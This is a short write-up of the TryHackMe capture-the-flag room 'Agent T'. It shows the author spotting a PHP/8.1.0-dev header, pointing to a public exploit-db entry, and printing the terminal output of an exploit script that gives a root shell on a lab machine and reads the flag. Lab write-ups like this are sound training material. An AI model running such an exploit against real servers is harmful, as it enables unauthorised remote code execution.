---
title: "Agent T"
date: 2025-02-01
image: /assets/img/general/CTFgeneral_image.jpg
description: Writeup of the TryHackMe-CTF Agent T
categories: [TryHackMe, Easy]
tags: [linux, web]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Plattform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Agent T</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Something seems a little off with the server.</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/r/room/agentt">https://tryhackme.com/r/room/agentt</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Agent T.  

## Challenge
The description focuses the challenge on the website, so I directly moved to it and skipped the initial `nmap` scan. The webserver provided a dashboard:

![Dashboard](/assets/img/tryhackme/AgentT/thm_agentt_1.jpg)

I used Burp Suite to intercept the requests while interacting with it. An interesting header was set: `X-Powered-By: PHP/8.1.0-dev`. Research on this PHP version led me to this <a href="https://www.exploit-db.com/exploits/49933">exploit-db</a> entry. 
```bash
$ python3 exploit.py                      
Enter the full host url:
http://10.10.120.98/

Interactive shell is opened on http://10.10.120.98/ 
Can't acces tty; job crontol turned off.
$ whoami
  root

$ find / -name flag.txt 2>/dev/null
  /flag.txt

$ cat /flag.txt
  flag{[removed]}
```

solved! :)
